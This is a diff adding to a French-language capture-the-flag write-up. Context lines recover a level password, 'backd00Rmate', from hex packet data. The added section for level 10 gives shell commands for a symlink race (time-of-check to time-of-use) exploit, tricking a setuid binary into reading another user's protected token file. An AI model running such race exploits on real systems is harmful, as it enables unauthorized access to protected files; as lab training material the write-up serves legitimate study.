@@ -117,3 +117,9 @@ On affiche les paquets sous forme héxadécimale et on a ceci :
 
 On peut voir que les points dans les mots à la verticale ont pour valeur 0x7F, ce qui en ascii vaut 127, soit le caractère d'effacement. Ce qui donne **backd00Rmate**, qui est le mot de passe de l'utilisateur flag08.
 
+### 10)
+
+touch /tmp/token
+ln -s /tmp/token ~/token
+ln -s /tmp/token ~/token
+$(sleep 0.0001;ln -fs /home/flag10/token ~/token) | ./flag10 ~/token 127.0.0.1 -DHITHERE
